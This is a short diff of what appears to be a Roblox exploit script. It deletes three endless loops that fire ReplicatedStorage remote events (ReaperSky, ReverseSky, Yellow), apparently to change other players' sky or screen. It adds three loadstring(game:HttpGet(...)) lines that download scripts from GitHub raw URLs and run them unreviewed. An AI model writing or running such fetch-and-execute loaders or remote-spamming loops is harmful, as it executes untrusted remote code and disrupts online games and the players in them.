@@ -1,23 +1,5 @@
-while true and task.wait() do
-    
-    game:GetService("ReplicatedStorage").ReaperSky:FireServer()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rcisback/Blackscreen/main/A"))()
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rcisback/Yellowsky/main/A"))()
 
-    
-end
-
-while true and task.wait() do
-    
-    game:GetService("ReplicatedStorage").ReverseSky:FireServer()
-
-
-    
-end
-
-while true and task.wait() do
-    
-    game:GetService("ReplicatedStorage").Yellow:FireServer()
-
-
-    
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rcisback/YellowScreen/main/A"))()
